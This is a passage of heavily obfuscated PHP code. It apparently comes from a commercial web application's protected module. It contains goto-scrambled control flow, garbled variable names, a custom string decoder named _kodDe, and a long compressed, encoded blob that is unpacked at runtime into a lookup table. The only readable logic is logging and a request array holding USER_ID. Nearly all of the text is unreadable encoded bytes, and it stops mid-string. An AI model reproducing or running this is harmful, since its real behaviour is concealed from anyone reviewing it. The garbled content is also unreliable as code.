D¶¥ÃêË‡Ğ; eå¯–³Ô”É: if (!$b®œÕÈ‹½ò) { ob_start(); var_dump($c˜ôˆì¾Ø÷); $EõãÎŞ„ = ob_get_clean(); self::log($D½“™ÒÖÉ[1445] . json_encode_force($EõãÎŞ„)); } if (!$C‚ï¦—‚÷× || !$c˜ôˆì¾Ø÷[$D½“™ÒÖÉ[367]]) { return !1; } $b¢ĞÖì“ÛŒ = array($D½“™ÒÖÉ[29] => $D½“™ÒÖÉ[1444], $D½“™ÒÖÉ[1423] => USER_ID, $D½“™ÒÖÉ[89] => $C‚ï¦—‚÷×, $D½“™ÒÖÉ[359] => $b®œÕÈ‹½ò); goto BÚÒ‚¡í¥ò; D¶¥ÃêË‡Ğ: } public static function log($A£›˜¯å÷æ) { write_log($A£›˜¯å÷æ, $_SERVER[“][1446]); } } goto c‹Ş»×ê¿Ÿ; f‰ŞÃºš¼À: if (!function_exists('_kodDe')) { function _kodDe($cª±ÓÚ›Ò¿) { $cª±ÓÚ›Ò¿ = base64_decode($cª±ÓÚ›Ò¿); $BÄ©ê×Š“˜ = strlen($cª±ÓÚ›Ò¿); $Dµšï†ñê = ''; $a¶Ë®¿Öä˜ = ord($cª±ÓÚ›Ò¿[0]) - 30; for ($Fâ²ŞåùĞ = 1; $Fâ²ŞåùĞ < $BÄ©ê×Š“˜; $Fâ²ŞåùĞ += 2) { if ($Fâ²ŞåùĞ + 1 < $BÄ©ê×Š“˜) { $Dµšï†ñê .= chr(ord($cª±ÓÚ›Ò¿[$Fâ²ŞåùĞ + 1]) + $a¶Ë®¿Öä˜); $Dµšï†ñê .= chr(ord($cª±ÓÚ›Ò¿[$Fâ²ŞåùĞ]) + $a¶Ë®¿Öä˜); } else { $Dµšï†ñê .= chr(ord($cª±ÓÚ›Ò¿[$Fâ²ŞåùĞ]) + $a¶Ë®¿Öä˜); } } return $Dµšï†ñê; } } define(strrev('“'), base64_decode('1++EmrHS+Q==')); $_SERVER[“] = explode("\174\4\174\5\174\3", gzinflate(substr(base64_decode('H4sIAAAAAAAAA519CXwbxfUwRygQjkJbrpZjcRJ8RIePXDi2E9mSYxHZMpKcy3KUlbSS1pa08u5K')."\xb2\x9d\xa4\x50\x6e\x8\xe1\x28\x90\x0\x1\xa\x14\x68\xa0\x40\x1a\xae\x72\x94\xfb\xe8\x41\x5b\x4a\x39\xcb\x7d\xe4\xe0\x28\xa5\x81\x52\x68\xf9\x93\x7e\x73\xcf\xec\x4a\x86\xf6\xe3\x47\xac\x99\x37\x6f\x66\xe7\x78\xf3\xe6\xcd\xcc"."\x7b\x6f\x2e\xfc\xfb\x4f\xd7\x4c\x59\xb3\xcf\x9a\xbd\x9f\x7b\xef\xfe\xdf\x3e\xfa\xfe\xd9\xaf\xfc\x18\x47\xd7\xec\xb5\x66\x4f\x10\x42\xe1\xe3\xd6\xed\xb7\x7\xfa\x6f\xef\xdc\xc9\x43\xc1\xc7\x1a\xbf\xb7\xfe\xa9\xda\x53\xf6\x9\x76"."\34\325\263\246\366\133\123\224\356\243\106\327\355\35\273\362\317\53\227\165\275\237\173\305\365\235\307\57\54\353\7\154\72\143\343\325\306\35\327\174\71\352\172\65\366\361\226\177\316\375\270\316\363\335\303\62\113".base64_decode('hnujnzyy8bW9bz7Ws/GRD4ZvO3DX8nXGyAP33DX9nt7X927fcMiVq99s+/nqb5294vQPv9KK/zz4')."\252\256\105\227\76\124\236\262\366\264\337\235\376\141\303\64\371\210\377\350\307\77\362\345\321\163\127\275\363\335\330\151\57\36\130\222\172\312\373\35\174\323\303\35\47\157\74\376\211\15\236\334\236\77\77\244\174"."\152\377\365\323\167\67\377\361\231\137\135\370\153\145\372\254\135\207\76\175\202\372\350\312\73\315\337\335\244\376\361\251\117\247\117\154\374\105\347\276\313\227\357\163\356\233\115\217\274\55\55\276\346\345\354\105\301".base64_decode('nodndM05qaOn7aUZxfRr2/oL6UvP/fx3p4Vr/tj65LXeo5NTXvzRW3u+89fPp/xyyvlbLj3ruc8m')."\176\65\165\363\305\117\237\360\371\226\373\356\176\347\355\347\76\215\77\253\255\156\376\154\357\215\207\253\177\330\171\374\363\243\7\374\302\163\235\74\143\356\35\17\175\62\343\31\371\316\15\133\337\277\350\211\125"."\x73\xea\xe\xbb\xe6\xf0\x7d\x1e\x72\x46\xdb\x5d\xf7\x4e\xff\x6a\x9f\x97\x1c\xbf\x9d\xf2\xd4\x5e\x7b\xec\x81\xfb\xb7\x15\xff\x48\x79\xcd\x94\x94\x31\xd5\x30\xd\xc\x48\x68\xf9\x94\x9a\xc6\x61\x35\x8f\x7f\xdd\xf8\xc7\x18\xcd\xaa"."\246\202\303\261\276\140\44\26\36\350\357\367\205\42\61\122\242\230\236\323\222\44\124\220\165\71\107\12\57\50\272\1\76\45\26\27\53\150\5\45\157\201\160\100\122\66\345\270\154\220\222\274\235\61\257\257\77"."\20\134\36\213\54\357\367\21\214\170\154\264\250\350\343\70\206\202\141\123\326\315\210\232\123\30\106\131\147\365\352\364\55\362\367\111\221\220\247\57\354\351\212\370\203\175\30\334\25\354\355\365\107\52\341\241\140"."\x20\xd0\xe9\xe9\x5a\x5c\x99\xd2\x1f\xf2\x2c\xea\xf5\x48\xa0\x7e\x59\x25\xa6\xe6\x53\x5a\x9d\xb4\xa\xa7\xac\x92\xea\x71\xa0\x5b\x55\xb2\x49\x1c\xcc\xcb\xb4\x3a\xe6\x78\x81\x84\x22\x2c\x4\xc6\x20\x5f\xcc\x66\x71\xa4\x8f\x85\x48"."\375\225\224\134\314\222\76\363\212\221\202\256\346\144\332\364\305\312\70\203\342\200\134\64\65\65\237\300\21\337\230\251\313\34\16\152\234\320\225\234\222\47\105\205\175\1\137\127\104\202\325\224\272\103\301\136\211"."\xc\x45\x4e\x36\x4c\x45\x97\x96\xf6\xf8\x42\x3e\x9\x56\xbd\xbd\x16\xb5\xb8\x56\xc2\xf9\x6\xfa\x40\x87\x48\x9e\x40\x40\x9a\xac\x4\x53\xc9\x15\x68\x31\x38\x4f\x95\xc2\x82\x21\xaf\x2f\x24\x75\x2e\x97\x78\x3f\x25\xb4\x5c\x4e\xcb"."\xbb\x40\x29\x60\x3c\x4d\xa1\xaa\xbe\x50\x8\x7\x1c\x84\x82\x3\x7e\x38\x74\x24\x12\xec\xee\xe\xfb\x58\x8c\x34\xee\xe4\x0\xa8\x49\xb\xa1\x52\x4b\x2c\x99\xca\x9a\xb1\x92\x9c\x2d\x52\x62\x1d\xc1\xbf\xb5\xe4\x87\xfc\x6a\x6\x21"."\340\121\65\257\26\11\261\222\42\64\215\315\34\22\50\122\154\205\102\162\40\233\106\346\24\230\140\45\34\154\357\300\277\363\11\122\74\6\323\24\335\214\51\371\204\226\124\363\144\32\56\40\123\216\20\236\154"."\x66\xbc\xba\xa\xf0\x48\x81\x9a\x2b\xa1\x15\xc6\x7b\xb5\x12\x69\x43\x4a\xcd\x2a\x1\x36\xcb\x52\x5a\x36\xa9\xe8\x3c\x5e\x0\xd9\xc5\x14\xd2\x18\x75\x42\xc8\xdd\x57\xcc\x89\x28\x2c\x9a\xc8\xa8\xd9\xa4\x4e\x27\xe7\xd7\x61\x36\x91".strrev('{¹Èş'."\r".'Õq„\\S¡IøJ„•@êö@é'."\0".'Îzku¡`E4X&(7}¨]†NMY'."\n".'Mh0ÍÓb')."\150\160\41\370\123\117\270\130\224\124\55\243\144\263\61\145\114\41\23\44\227\234\155\320\332\273\215\270\232\167\3\10\216\372\203\261\214\154\144\172\223\263\143\50\27\145\216\111\145\314\125\310\24\310\34\146\323".strrev('Î5%hÔ¥mU§©rÒ½JJC¯$¢‚°ê<åi‡a\'ÉXBÍ1œ8¥±YÈKVlXéš}ßØ`!j6')."\x39\x5e\xc6\xcc\x65\x59\x88\xb6\x96\xc1\xc\x6\x34\xc7\x8\x4d\xd4\x90\xb8\x32\x66\x92\x4e\x92\xe6\x27\x32\xb2\xe\x86\xaf\xbd\x68\xa6\x9c\xf3\x8\xe3\x28\x14\xb2\x6a\x42\x36\x55\x2d\xef\xd6\x12\xa6\x62\x3a\xd\x53\x57\x64\x52"."\x5a\xcd\x7c\x9\x52\x4\x9c\xc1\xd\x38\x17\x9d\x3d\x5d\x5a\xde\x4\xd3\xd7\x19\xd1\xe5\xbc\x91\x52\x74\xa7\x8f\x90\x77\xab\x4\xfa\x99\x71\x30\x8a\xe6\x55\x8d\x82\x66\xa8\xf0\x33\xad\x92\x6c\x9a\x72\x22\x3\x67\x3f\x2f\xbe\xfd".base64_decode('a/DVfFbNKxW4nkRCMQwnzKJrWacnm9XKzqCuplWQp8FWTcCZWiXKNguqrhg0Ki3qjRBkUCvF2a/L')."\351\234\334\52\25\212\161\320\63\144\176\126\201\141\154\362\365\126\51\1\243\16\51\127\64\114\247\256\0\366\243\202\205\216\14\236\77\345\354\205\343\251\52\111\147\30\160\151\2\156\151\234\45\1\62\222\150".base64_decode('Gob2RCL9MX83WIz7fLFeT6Srh1TblNO0zgHAe1mRFLjMCaYcJLQ+0Ecc2K+VFR18uHO8VRrRknFt')."\xcc\x45\x93\x20\x72\x18\x70\x9\x8a\xc\x7b\xb4\x60\x3a\x43\x72\x3e\xd\xfb\x27\x3e\x6e\x2a\x84\x1c\x8d\x52\xda\xda\xa1\x1\x25\x9f\x36\x33\x34\x63\xd8\x17\x5a\xe2\xb\xc5\xc2\xc1\xee\xc8\x52\x4f\x88\x2c\xe3\x79\x30\x10\x63\xf4"."\123\260\350\254\63\244\44\101\327\47\114\232\117\56\300\136\243\70\160\242\300\61\246\251\160\362\320\264\200\177\21\354\30\257\323\0\110\116\21\213\226\35\120\163\52\254\273\311\122\120\117\202\65\176\21\251\220"."\x1b\x35\xa8\x3d\x9a\x69\xa8\x8b\x26\x67\xd6\x3b\xc1\xdf\x86\xfa\xc1\xa8\xd7\xd5\x30\xb4\xc0\xad\xf2\x3c\xee\x26\x57\x93\xd4\xdc\x38\x47\xea\x7\x42\x87\x2a\x67\x25\xd2\xe8\xa\x8c\x46\x29\xb8\xf8\x6b\x3a\x0\xae\x49\xc2\x34\xb7"._kodDe('Lg1ldvYXbOj/gbKfSMIf5AMfgizoBBTgwJTECh0vtFQzcfSAmAJGRkrVw1QchDAEzvS6WsLjei9lAA==')."\150\110\307\142\316\307\43\141\65\127\240\14\312\314\24\163\161\41\350\346\45\20\132\0\103\306\330\222\306\326\40\115\47\241\126\67\311\62\243\271\233\62\133\167\270\5\374\317\71\153\122\313\311\124\22\105\23"."\127\111\342\231\213\101\15\226\224\36\105\346\213\232\251\233\32\204\352\26\224\136\305\314\150\244\237\323\12\255\122\221\325\215\326\62\251\144\25\332\113\31\205\162\151\40\136\225\130\347\25\164\45\245\22\272\5"."\xf2\x14\x80\x73\x2e\xac\x1a\x21\x90\x9\xca\x37\x34\xbe\x14\x8a\xa1\x1c\x60\x72\x86\x2d\x1b\x9c\xe9\xc3\x88\xb0\x32\x77\xf\x4\x2\xb1\xae\x60\x5f\x4\x88\xa2\x18\xb2\x34\xe4\x8f\xf8\x28\x45\x78\xbc\x31\x4f\x57\x3f\x5b\xc2\xf8".strrev('dì¦)Ìá79NcÀƒ‘[Î6ùŒbùœ’ÒLâ†òĞX^*YBérÎÏ¾š”†Ù+=80')."\x55\xb7\xae\x6f\x52\x44\x5c\x26\xfd\x64\x8\x38\xb3\xcc\x82\x45\x15\xec\x2f\xe8\xc2\xda\x1f\xc\x93\xc\xb\x20\x14\x48\x23\x71\x45\x27\xf5\xe8\x1f\x20\x49\x39\x61\xf8\x17\xf9\x8\x70\x2a\x5d\x1b\x65\x22\xb9\x78\x96\x86\x29\xa3"."\x2b\x2\x7c\x5d\x9d\x90\x79\x1b\x17\xd0\xfa\x90\xb2\xc7\x72\x59\x2e\x60\xc5\x54\xcb\xf8\xc5\xb4\xf8\x30\xe0\x62\x80\xe8\xe4\x6a\xad\x76\xf2\xb1\x8a\xf4\xf8\xfb\x16\xc7\x7a\x83\x5e\x5f\x20\xe6\xef\x3\x5c\x22\x52\x9\x1f\xe8\xf7"."\x7a\xe8\xe0\x8b\xf0\xce\x60\xa4\xc7\x2\x1d\x0\x7c\x62\x89\x27\xe0\xb7\xa3\xfb\x96\xf9\xc3\x91\x70\xd5\x24\x0\x1b\xf0\xd9\x52\xc0\x96\xab\x3f\xe4\xeb\xf6\x2f\x63\xd1\x6e\xbf\x2f\xe0\xd\xc7\xba\x3c\x5d\x3d\x1c\xa7\xcf\xd3\x4b"."\42\261\24\334\364\30\156\53\176\14\60\274\60\333\72\305\112\160\33\110\73\63\146\331\247\304\250\4\36\343\164\2\26\57\205\320\46\151\56\334\174\242\226\20\231\70\241\25\51\265\62\41\56\107\31\104\116"."\x26\x33\x54\xa6\xb\x53\x1d\xfe\xa9\x97\x3c\x61\xc9\x2c\xc4\x18\x2b\x88\x8f\xb3\x20\x6a\x6\x8d\x3\x71\x8d\x7c\x5f\x22\xcc\xb7\xa2\x6\x31\x88\xd3\xa9\xa4\x34\x5d\xf9\x3a\x80\x27\x65\x32\xc2\xb0\xc5\xc1\xbc\xe1\x69\x60\x4\x3c"."\x68\x97\xb\x28\x1\x8d\x48\x8c\xce\x45\x3\xec\xf\x3c\xb4\x3a\x29\xbe\xc3\x8c\x5\xc1\x56\xdc\x3\xf7\xa7\xb1\xa5\xa1\x60\xdf\x22\x92\xa1\x9c\x51\x68\x5\xfc\xa4\xfb\xeb\xa8\x30\x43\xb6\xa9\x26\x67\x49\x40\x12\x91\xb9\x50\x49"."\73\175\130\243\135\271\6\377\234\200\177\200\360\106\76\256\344\151\257\307\41\143\146\214\203\356\101\300\154\241\114\125\53\262\257\305\65\55\113\347\61\130\217\31\277\140\33\334\141\203\22\311\30\145\116\63\351".base64_decode('qkUWh0hwsa8vRikLxwRqxACwZQyGSIeY2gjdwODEkC9MuYCujBZV2l1u10xCxQpYf8jn3Suj5Zl1')."\203\316\231\256\41\20\250\157\130\210\243\44\26\165\131\242\323\111\376\242\316\162\103\61\245\316\130\120\337\32\165\107\335\165\13\132\7\75\316\11\331\71\321\350\74\321\71\64\63\352\252\237\111\0\103\253\233".base64_decode('HbPWQgSAuGDaEPhpjy6YEXWe8MNVCwejQ7WtM4+PuqZFy0MN9QvodxJFHWzOEuOsqsmZdaBKQHxh')._kodDe('MWYV/7Hx8h2HA45hJYniAaKz+zY9CeC7cLnV8o4rL1HuA+xK/WztHbt8KfJgBln3uCrUfI4rT6auGA==')."\x9c\x17\x71\x39\x41\xf8\x80\x9a\xce\xb3\x29\x4\x16\x74\xb6\x29\xb6\x4a\xcd\xab\x67\xe0\xdf\xb5\x74\x20\xd3\xa\x5d\x96\xe1\x79\x96\x4e\xa8\xb3\x98\x57\x47\xe9\x56\x3f\xaf\x8c\x92\x80\x66\x52\xfa\x8e\x2b\x66\x59\xa1\xe4\x1\xe0"."\226\70\40\16\272\155\3\111\102\54\213\204\64\362\5\276\135\122\320\336\201\264\242\20\203\142\127\231\305\222\112\236\214\323\376\4\333\110\310\5\45\54\264\60\26\213\170\72\3\276\30\345\60\204\23\323\70"."\342\212\235\354\160\14\64\215\163\124\312\37\22\134\144\66\106\263\22\142\6\222\242\353\232\336\212\16\376\214\142\1\312\142\140\327\144\202\376\224\300\126\132\152\357\220\160\67\23\56\21\23\73\275\40\123\151"."\2\356\156\231\204\340\256\213\106\213\203\112\162\150\20\20\262\354\114\15\255\156\131\133\117\245\144\167\24\374\107\43\230\177\221\32\27\370\370\31\100\326\112\230\154\301\255\70\237\212\61\16\10\253\300\216\31"."\64\235\255\263\20\316\245\126\123\63\345\54\103\203\151\21\10\241\334\206\256\325\144\217\216\7\60\300\231\20\134\235\205\323\73\304\41\373\330\321\24\73\161\20\16\216\0\314\41\104\361\337\366\32\312\246\363"."\140\42\164\361\105\312\357\165\222\101\364\54\163\372\211\0\317\2\52\25\65\145\60\235\115\12\65\264\242\236\120\30\216\105\310\60\145\35\254\131\134\262\203\62\230\160\274\10\152\356\200\347\20\16\270\246\72"."\200\264\347\200\347\75\16\56\261\72\370\21\202\203\311\237\16\42\226\72\170\351\44\350\367\72\124\303\213\304\143\124\56\112\242\165\66\63\160\103\236\225\307\35\270\376\1\245\244\144\35\264\366\16\332\50\7"."\155\201\3\355\67\274\244\66\3\200\76\110\155\120\20\60\211\214\3\16\7\34\133\132\12\14\322\156\140\102\265\203\13\334\216\264\256\25\13\375\364\113\102\14\127\206\0\170\115\31\40\244\151\246\203\156\200".strrev('9¼‰Ş!ãö"7Ù..<Óò’Ÿƒ	[ÎÁÕp$¹nôÂ†¯n8	¤Ÿ-×œÂZX q— X')."\76\157\312\151\372\355\52\251\70\34\122\22\343\11\276\271\361\12\273\45\153\214\15\75\242\303\152\304\124\175\350\31\201\60\132\233\272\377\376\224\262\71\35\21\362\261\20\333\244\324\315\333\24\54\360\25\7"."\62\204\60\340\203\302\224\247\240\40\347\60\105\262\102\312\106\202\312\62\145\172\117\241\120\230\120\177\332\172\113\271\60\312\147\46\155\242\4\13\160\10\74\33\216\216\223\17\261\20\45\77\252\26\303\375\32"."\xcb\xb1\x9d\x5\xeb\x68\x1b\x33\x82\xfd\xde\xaf\xe6\xc7\xd5\xbc\xb8\x77\xe7\x50\xce\xf3\x38\x51\x40\xf2\xe6\x31\xdc\xc7\x93\x85\x31\x6f\xe1\x67\x3\xe\x72\x66\xe0\x0\xfb\xc6\x11\x81\xeb\xf1\x3d\x2e\xa8\x3d\xcc\x2a\xd4\x9d\x94".base64_decode('ZKs5nYBOa5TPxwGwTYrZSJUQaUbWeS/TOQYJm7XKgCg8KqCl5BJn95Y8wswwzHF2zCEErYXiqHey')."\x48\xf\xdb\xfd\x55\x8b\x8a\x93\x4e\x35\x2\xa0\x37\xab\x85\x51\x4b\x23\x5a\xd5\x28\x3c\x63\xa0\x61\xd\x51\x3c\xbd\xa3\x80\xe2\x82\x4\x4\x5\x7a\x7e\x46\xe5\xfe\x98\xed\xfc\x1\x44\x85\x21\x8c\x59\x8e\x2a\x70\xfd\x3c\x8c\x27".strrev('ÒvÁ$:d©…©l±T†£ü¢Úƒn6vˆ­«ÄÂÑÌì ,8²äKâyq<r³ÙÁwF†\'‰')."\xa5\x63\x96\xe7\x2\x72\x9\xb9\x4\x72\x34\xa\xeb\x1e\x9f\xd7\xab\x8d\x71\xc3\x54\x72\x84\x45\xae\xb5\xf5\x8e\x9\xf6\x3d\x71\x59\x77\xe9\xa0\x46\xbc\xa2\x7c\xad\x20\x52\x49\x91\x1\x86\xec\x18\xb8\xf8\x80\x46\x85\x64\x38\x31".base64_decode('fEnVhBDI5jR6msURBf7PYEKBqEtcFWOQVUdILscMC2Y1Fu9qQMzYxRclcUkTr5sgGm85vL7CIeGi')."\66\307\356\263\20\320\145\230\132\201\247\10\121\234\54\44\361\102\5\54\326\371\250\206\140\151\110\42\301\201\167\41\302\45\171\221\150\215\211\333\225\5\30\56\221\107\171\164\235\22\11\156\36\74\332\1\100".base64_decode('EQTncZgeLVZj1bhwX4lfwOKi4IddeOVyyclkkJ67ieFKVPGYoXpB6E6cFSXEqqN7sll+wWaPT5oF')."\317\125\61\223\10\231\64\133\67\222\216\351\311\167\65\30\23\366\272\155\64\304\147\34\277\300\264\313\302\126\346\363\115\162\132\305\14\340\3\132\75\16\371\143\106\315\53\6\133\262\164\243\32\237\371\46\301"."\xc7\x22\xe\x5b\x25\x1c\x51\xb4\x21\xeb\x24\x6f\xae\xd8\xad\x90\xfc\x27\xa3\x5\x98\x26\x9c\x36\x81\xcd\x15\x0\x88\xb\xc\x3b\x52\xe1\x7c\x47\x58\x43\xd1\x7a\x14\x33\x2d\xf2\x40\x8\x95\x21\xcc\x7\xcb\x10\x83\xf9\x87\x5b\xd4".base64_decode('rWs5fxDMr+pEZ8dT6KESYmpjbK8mZgJEAlehycqkyawovmSd94vdt7/081dw5M+nf3zfFzjY3EwO')."\xa0\xd7\xec\x5\xfe\xee\x83\xc3\x5c\x7\x69\xed\xb2\xf\xf3\xef\x3e\x75\xd8\xb7\xa6\x6e\x6b\x9f\x33\x37\xf1\xee\x53\x2b\x4e\xba\xde\x71\xf3\xfb\x87\xcf\x5c\x7c\x87\x73\xf0\x9e\x5b\xd7\x7d\xf4\x87\xfc\x9d\x4f\x5c\x74\xf4\x79\x77"."\xf5\x1c\xec\x3b\xd8\xf9\xdb\x3f\xfc\xe4\xda\xdc\x1d\xff\xba\xb8\xc6\x17\xbe\xb6\x7e\xc5\x5d\x9e\x3\xee\x5a\xb8\xe9\xf5\x3d\x9c\xdf\x99\xe5\x79\xf3\xa6\x87\xb6\x39\x5b\x9f\xbf\xea\xa8\x1f\xbf\x32\xef\x91\xf8\x93\x27\x1a\xf3\x37"."\176\174\325\247\353\167\265\25\316\75\367\315\257\36\175\300\375\340\227\241\37\375\347\117\177\332\365\305\306\277\175\361\356\37\232\33\256\174\341\17\337\331\170\376\320\365\323\312\247\376\254\351\202\214\347\327\207"."\357\57\337\171\304\223\67\155\275\157\371\326\6\337\272\305\65\337\17\275\363\343\243\16\376\327\221\373\74\52\375\363\137\345\267\236\112\324\176\356\374\331\27\377\131\164\305\76\151\357\232\243\176\123\274\173\336"."\143\327\245\236\174\350\121\345\201\63\2\67\274\363\356\326\173\235\77\213\76\176\355\301\273\66\145\347\6\152\326\235\167\346\267\316\135\73\365\373\117\135\172\106\347\205\267\336\377\316\356\167\75\163\237\70\366"."\272\145\53\336\213\137\176\136\374\352\203\344\221\43\257\77\363\360\373\56\370\321\235\173\175\373\354\304\125\307\172\343\67\237\376\256\362\130\143\346\363\13\137\175\374\342\122\333\173\205\107\333\177\75\167\327\257"."\16\171\371\321\366\361\55\277\132\267\366\214\75\317\175\344\262\343\217\35\71\366\372\263\156\363\17\176\334\276\144\316\7\231\167\257\337\272\353\275\237\175\176\127\371\305\267\17\374\242\351\360\160\344\266\347\177"."\176\313\365\107\334\367\304\225\363\337\275\176\305\311\57\364\46\56\131\34\310\236\330\121\127\376\323\310\256\13\337\336\57\372\152\140\101\353\203\135\273\37\174\356\243\334\354\373\127\54\271\364\323\217\36\373\323"."\320\31\305\110\175\375\324\47\306\332\236\234\32\372\335\375\371\15\147\4\17\31\50\336\270\344\344\247\7\134\243\351\15\362\13\303\112\370\266\107\157\137\227\31\136\161\367\304\223\233\57\57\316\373\113\333\161"."\57\365\336\270\344\361\236\355\77\276\342\210\253\76\74\354\311\347\27\177\366\375\215\323\367\150\270\152\376\330\22\311\163\332\272\272\263\57\313\334\264\311\167\343\222\131\43\113\146\337\371\306\214\3\57\174\374".strrev('Ûòrû\'Ø?£ìëİŸÕm^‹ÿbaªw|wÚ›©ù·º?ûšÅs÷gİ¿Ñòv=6ıéözïÓş?”ÂÆå')."\27\164\274\164\263\374\301\222\7\263\373\315\74\370\310\66\351\332\307\175\336\255\57\15\336\162\360\362\163\367\174\344\131\375\203\103\306\347\315\317\277\275\137\376\37\115\163\66\315\231\163\102\357\271\163\246\115"."\xbd\xed\xa7\x17\x79\x5e\x39\xb5\x65\xaf\xef\xf9\x5a\xbe\x73\xe5\xe9\x2f\x1f\x76\xf3\xfa\xaf\x8e\xfc\xc5\xdb\x8d\x6f\x15\xdf\x7a\xf1\xa8\xd3\x97\x9d\xfa\xd4\xbd\x8b\x93\x37\x4d\x3d\xf4\x81\xd1\x4e\xff\x45\xb7\x1d\x75\xcc\xb4\xb9"."\xd9\xa9\xee\x4f\xde\x76\x7d\xf6\x48\xeb\x59\xab\x76\xcc\xdb\xbd\xbe\x7d\xdb\xbd\x3f\xf5\x49\x77\xfc\xe6\x1f\x47\x9f\x92\x4c\xc8\xaf\x5f\x7e\x63\x7f\xa3\x74\xc6\x4d\xdf\x7a\xee\x90\x77\x57\x4a\xc6\x9f\xbb\x8f\x3f\xf6\xe2\xbd\x5f"."\x2b\x2c\x3f\xe6\xfb\x5b\xef\xfb\xfd\x53\x87\x7e\xdf\xfd\xe4\x63\xc3\xc3\x1f\xb7\xde\x54\x7f\xcf\xbf\xc7\x4a\xbf\x7f\xec\xa1\xde\x68\x78\xca\x21\xde\xf5\x52\xcf\xa1\x57\x6f\xbd\xfa\xcb\x89\x53\xd7\x9f\xf9\x76\xaa\xf8\x9b\xf3\x36"."\xb9\xba\xdf\x1e\xde\x1c\xda\xfb\xbe\xf3\xaf\xf6\x2f\xf9\xf5\xbe\xcd\x53\x16\x6f\xba\xff\x82\x5\xe3\xdb\xa6\x5c\x7f\xea\xbf\x36\xb4\x9c\xb5\x3c\x50\x3f\xf3\x95\xae\x73\x1e\x38\x33\x3e\x77\xdf\x83\x76\x1f\xf4\x8b\x67\x72\xe7\x7a"."\137\60\66\314\131\377\233\51\137\376\274\46\366\273\15\27\377\350\326\300\216\53\217\72\146\277\73\327\136\164\356\73\37\214\335\367\366\363\327\225\356\231\263\342\212\300\263\323\257\131\272\361\204\135\255\167\234"."\133\327\375\363\167\367\157\222\343\127\334\164\324\17\306\366\376\315\15\237\336\161\303\33\167\134\176\314\163\77\152\330\171\305\141\273\267\276\160\144\351\312\127\116\116\334\265\251\270\363\320\155\123\223\316\203\247".base64_decode('lRa/uuDsf55b86ubh1+em7xn68//cssF2sWvbfjeXuuvWnOE758HnDbljItm/mbu7Bf3WPbFDV1f')."\234\355\234\173\377\77\136\253\337\130\114\276\277\354\60\65\171\322\201\217\157\135\161\317\161\265\255\167\374\161\266\336\166\325\167\63\227\372\147\115\275\162\376\311\77\36\277\326\374\360\132\143\363\354\373\137\177"."\xe3\xe6\x17\xdf\x1f\xfd\x8b\xba\x7a\xf1\xf\xfe\x31\xf1\xd3\x17\x7e\xfc\x61\xcd\x75\xd9\x9a\xf\x5b\xaf\xd9\xfb\xec\xdf\x1f\xf1\xfc\xb3\x2f\xc4\xb7\xe\x2f\xf9\xcc\xdc\xb3\xe5\xf0\xd6\xd4\x3f\x8e\x39\x68\xb5\x7f\x9f\x35\x57\x7c"."\xb5\x35\x7a\xc9\xe6\xd6\xef\x2c\xbf\xf4\xef\x87\x34\xdc\x76\xe8\x9\x3b\x6f\x7d\xfb\xc3\xb3\x5f\xeb\x5f\xf8\xe8\x6b\xb3\xf\x5c\x7c\xf3\xd2\xfe\x7d\xde\x59\x7d\xf8\xd6\xdc\x5f\x32\xcd\xd7\xbe\x97\x74\xdd\xf5\x49\xdb\x3b\x47\x1c"."\370\35\307\221\7\155\125\217\177\177\367\17\317\270\144\331\317\366\271\67\174\253\337\375\334\340\234\53\365\317\16\10\73\136\250\157\316\277\172\344\364\350\310\310\350\323\267\366\266\135\365\374\216\301\233\332\3".base64_decode('z3asnJ654KG0f8Vw7PJ/PnzKLcUHlvtfO/KOO1/fMN+96abjN7g+da1JHrb1ustvabjg0qNSl1yx')."\301\333\160\365\275\247\77\176\321\31\356\307\167\155\235\166\236\367\220\33\136\374\205\147\343\233\373\327\325\37\176\222\276\343\214\256\263\56\374\174\265\363\243\33\332\217\74\51\365\335\370\1\147\357\65\366\300"."\117\237\275\170\116\106\373\345\276\37\355\231\131\65\355\315\43\36\174\300\230\167\364\326\266\147\257\174\140\375\343\217\227\216\170\244\366\316\67\147\234\377\366\261\327\372\317\333\262\361\342\317\336\172\101\377\155"."\301\177\340\360\226\5\343\153\337\364\72\77\375\375\65\216\332\201\27\366\331\375\241\363\251\211\255\147\334\72\174\367\201\107\115\311\157\233\242\73\357\333\331\361\361\226\327\267\135\177\167\106\377\311\226\301\226".base64_decode('Q32ft7QefejJt/2h+YHNt67Y8uAff/3tlbN/r/tve21o8JTcR7Mb38pe37LhrA8Pe+E3L953+PzZ')."\227\264\236\320\367\370\66\357\53\167\374\375\361\31\372\333\57\154\271\146\345\127\273\166\316\175\146\367\304\247\377\367\340\207\13\36\376\374\243\332\237\274\321\166\312\356\35\177\370\164\213\153\301\227\277\336\376".base64_decode('5U9Wrt298cNnrhn6z+4jZn4o3Xvhvx78+P+Wffvjr6Zc8NTTr1x2VvvO77o+OPZv2y7af8b1byV+').strrev('`uG·í:à\\óî›BÇiÇ¸Ö=ôçñåu6ØÎxï/aÌ‰ı²|o›MâÈÕà>"?·¾çü‰÷').base64_decode('QHny/tlrzp/7g0tuOPx2pzt74+jgs1dv/e6mM/64zx9Hl1zeu65+v09e3veS12696MtdXywzu5d3')."\x87\xff\xf9\xd8\xca\x9a\x23\x57\xbc\xb9\xf7\x73\x57\x76\xbc\x31\x96\xc8\x7d\xf5\xdb\x7f\x7f\x58\xbe\xbb\xf5\x4f\xc5\x9f\xdf\xba\xe1\x9a\x5b\x6f\x7b\xf3\xf5\x37\x5f\x3d\xf6\x9e\xf\x36\x8c\x97\xae\x59\x30\xf3\x93\x9a\x3f\x74\xd7".strrev('‡…ŒÏ³~Şùê¬\'¼Çûï›kçrwÕŞOyÚ²KÅø¿l½Å2¼fS}İø­—“Å÷,¸?Ü^sèùU»')."\367\76\366\355\354\11\73\137\236\61\327\371\236\143\336\250\324\377\326\237\216\367\35\277\371\246\33\326\237\360\100\302\357\73\340\326\31\247\314\335\143\377\7\146\354\167\316\74\357\274\251\77\73\147\333\257\307".strrev('OÛs'."\r".'ºärßwy­şy?ÑÇüÿ­ùûY